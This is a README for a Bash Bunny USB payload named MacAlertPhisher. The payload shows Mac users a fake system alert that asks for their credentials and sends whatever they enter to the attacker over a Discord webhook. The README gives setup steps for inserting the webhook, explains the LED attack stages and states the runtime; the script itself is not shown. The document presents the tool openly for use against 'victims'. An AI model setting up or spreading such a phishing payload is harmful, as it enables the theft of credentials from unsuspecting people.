# MacAlertPhisher
* Author: 90N45
* Version: 1.0
* Target: Mac
* Attackmodes: HID, STORAGE

### Description
Creates a customizable alert that prompts for the victim's credentials and shares them with you via Discord. Even after unplugging the Bash Bunny.

<img width="532" alt="MAcAlertPhisher_alert_preview" src="https://github.com/90N45-d3v/bashbunny-payloads/assets/79598596/d52f4924-c51a-46fd-b2c3-2a8cce45e2cc">
<br>
<img width="412" alt="MacAlertPhisher_message_preview" src="https://github.com/90N45-d3v/bashbunny-payloads/assets/79598596/8d4e804c-0630-4853-b4ed-7d0904408a50">

### Setup
Please insert your [Discord’s Webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) link into the `discord` variable in the `script.sh` file. Optional, you can change the other variables at the top of the `script.sh` file to your needs.

### Status
| LED | State |
| --- | --- |
| Magenta solid (SETUP) | Set ATTACKMODE |
| Yellow single blink (ATTACK) | Prepaires and executes phishing-script on the victims machine |
| Green 1000ms VERYFAST blink followed by SOLID (FINISH) | Attack finished (Ready to unplug) |

*Average runtime: 27 seconds*
